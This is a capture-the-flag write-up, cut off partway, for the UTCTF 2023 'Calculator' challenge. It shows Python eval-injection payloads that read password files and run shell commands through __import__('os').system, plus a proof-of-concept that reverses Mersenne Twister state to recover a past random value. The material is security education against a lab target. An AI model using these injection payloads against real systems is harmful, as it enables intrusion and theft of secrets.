---
title: UTCTF 2023 - Cracking the Random
url: https://fireshellsecurity.team/utctf2023-calculator/
source: FireShell Security Team
date: 2023-03-18
fetch_date: 2025-10-04T09:58:03.546056
---

# UTCTF 2023 - Cracking the Random

[![](/assets/images/title.gif)](/)

* [Home](/)
* [Team](/team/)
* [Articles](/articles/)
* [Portfolio](/portfolio/)
* [Sponsors](/sponsors/)
* [About](/about/)
* Toggle theme
  + Light
  + Dark
  + Auto

Friday, March 17, 2023

# UTCTF 2023 - Cracking the Random

by [Neptunian](/neptunian/)

UTCTF 2023 - Cracking the Random

![](https://i.imgur.com/L0ILszE.png)

[UTCTF](https://www.isss.io/utctf/) is maintained by the **Information & Systems Security Society** at the University of Texas at Austin.

Since I’m not a Python Jail Houdini like [Alisson](https://fireshellsecurity.team/infektion/), my solution was WAY, WAY harder than most (or all) teams.
But since it was an unintended solution and I learnt a lot in the process, it was worth it.

## Challenge: Calculator

### Recon

![](https://i.imgur.com/bozVe2q.png)

Yes, 77 solves, but since it’s a fun different path, it deserves the writeup.

The challenge is a number guessing game, where the right guess give you the password for the next level. The range of possible numbers is big, so you won’t really make the right guess (or maybe you’re a prophet, who knows?).

![](https://i.imgur.com/eOxoCAK.png)

It’s a simple form with a post to the server, no javascript involved. The guessing process is all done on the server side and the challenge is blind, without the server source-code.

```
<form method="post" action="#level-0">
  <input type="text" name="expression" />
  <input type="submit" value="Run" />
  <input type="hidden" name="type" value="calculate" />
  <input type="hidden" name="level" value="0" />
</form>
```

It says `It'll even do math for you!`. Let’s try it.

![](https://i.imgur.com/mO3u94F.png)

It works! It EVALuates the expression (spoiler-alert).

Now let’s touch the app with the evil hand, trying to force an exception with a possibly wrong expression.

![](https://i.imgur.com/g2dcDIN.png)

Gotcha!

```
result = eval(answer)
```

### Level 0

Since we can just send a string to `eval`, the RCE is just automatic.
Let’s try getting the source-code (we know the file name by the previous exception):

```
open('./problem.py').read()
```

And we get [problem.py](https://github.com/Neptunians/utcft-2023-writeup-calculator/blob/main/problem.py).

```
import random
password = open("password.txt").read()
solution = random.getrandbits(32)

answer = input()
result = eval(answer)

if result == solution:
    print(f"{result}, correct!  The password is '{password}'.")
else:
    print(f"Result: {result}.  The correct answer was {solution}.")
```

There is a password to unlock the next level, let’s try getting the password file.

```
open("password.txt").read()
```

And..

`Result: PuXqj7n4WNZzStnWbtPv. The correct answer was 4045986092.`

Let’s try it:

![](https://i.imgur.com/fZ73o2e.png)

That was easy. Bring more.

### Level 1

Let’s start trying the same.

```
open('./problem.py').read()
```

Not that good result.

```
Traceback (most recent call last):
  File "problem.py", line 7, in <module>
    result = eval(answer, {"open": None})
  File "<string>", line 1, in <module>
TypeError: 'NoneType' object is not callable
```

It blocked the `open` function. Can’t directly open the source or the password file… can’t we?

Let’s try a shell RCE. Since we can’t do multiline statements - like `import os` and `os.system("cmd")` - in the `eval` call, we can import using a builtin function and then call it.

```
__import__("os").system("cat password.txt")
```

`Krdi9yQuY8mHoteZDCF5Result: 0. The correct answer was 1615348051.`

Let’s try to check-in to the next level with it.

`Unlocked level 2`

Next!

### Level 2

Let’s start with the previous payload.

`cat: password.txt: No such file or directory`

OK, we still have the RCE with the same payload, but there is no password file. Let’s check the source code of level 2.

```
__import__("os").system("cat problem.py")
```

Resulting in [problem2.py](https://github.com/Neptunians/utcft-2023-writeup-calculator/blob/main/problem2.py):

```
import random, os
password = open("password.txt").read()
os.remove("password.txt") # No more reading the file!

solution = random.getrandbits(32)

answer = input()
result = eval(answer, {})

if result == solution:
    print(f"{result}, correct!  The password is '{password}'.")
else:
    print(f"Result: {result}.  The correct answer was {solution}.")
```

Now we are a little bit more restricted in the eval, but we have a bigger problem: the password file is just being deleted!

The information is in the `password` variable, but there is no file to read it.

We have (possibly) two options to get the correct result here:

1. Access the password variable
2. “Guess” the correct random number.

Since we can’t access the caller variables from the eval scope (more on that later!), I went to the second option, which is the unintended solution :S

I knew it is possible to predict the next random values in some scenarios, but getting previous random values is a different species.

The algorithm for the `random` module in Python is called [`Mersenne Twister`](https://en.wikipedia.org/wiki/Mersenne_Twister), with is a [pseudorandom number generator (PRNG)](https://en.wikipedia.org/wiki/Pseudorandom_number_generator), but it is not a Cryptographically Secure PRNG.

While searching for this, I came up with this EXCELENT [series of articles](https://jazzy.id.au/2010/09/25/cracking_random_number_generators_part_4.html) on cracking random values, by this beast crypto-hacker called [James Roper](https://jazzy.id.au/).

It turns out, the `Mersenne Twister` is based on a state, formed by 614 32-bit numbers. The `random` module allows you to get the current state. Let’s try it:

```
import random
random.getrandbits(32)
1273474650

random.getstate()
(3, (2494642692, 1550483902, 881532875, ..., 705994986, 3574982157, 1), None)
```

The function returns a tuple with 3 values and the middle value is the state. It also has a number in the end - `1` in this case. I didn’t learn what this number means, but it was either `1` or `614`. That is enough.

Let’s check if we can get the server state.

```
__import__('random').getstate()
```

![](https://i.imgur.com/ojE7W2q.png)

OK, I’m convinced.

The article have an algorithm that, in theory, can reverse the random state to the previous one. If we can calculate the previous state and set it again - using `random.setstate()` - we can generate the same random value again!

Let’s translate the article algorithm to Python and make a PoC:

```
import random

# Get the state before the random
_, first_state, _ = random.getstate()

# Get the solution random value
solution = random.getrandbits(32)

# Get the state after the random
first, current_state, last = random.getstate()

# Turn the state into a list, to work on it
new_state = list(current_state)

# Last was the constant number (1 or 624)
new_state[-1] = 624

# https://jazzy.id.au/2010/09/25/cracking_random_number_generators_part_4.html
for i in reversed(range(624)):
    result = 0
    tmp = new_state[i]
    tmp = tmp ^ new_state[(i + 397) % 624]

    if ((tmp & 0x80000000) == 0x80000000):
        tmp = tmp ^ 0x9908b0df

    result = (tmp << 1) & 0x80000000
    tmp = new_state[(i - 1 + 624) % 624]
    tmp = tmp ^ new_state[(i + 396) % 624]

    if ((tmp & 0x80000000) == 0x80000000):
        tmp = tmp ^ 0x9908b0df
        result = result | 1

    result = result | ( (tmp << 1) & 0x7fffffff )
    new_state[i] = result

# First value is always a constant
# Binary 10000000000000000000000000000000
new_state[i] = 2147483648

# Compare the states
print(new_state == list(first_state))

complete_target_state = (3, tuple(new_state), None)
random.setstate(complete_target_state)

cracked_solution = random.getrandbits(32)

print(f'Solution        : {solution}')
print(f'Cracked Solution: {cracked_solution}')
```

Resulting in [poc\_crack\_rand.py](https://github.com/Neptunians/utcft-2023-writeup-calculator/blob/main/poc_crack_rand.py):

```
True
Solution        : 1920796803
Cra...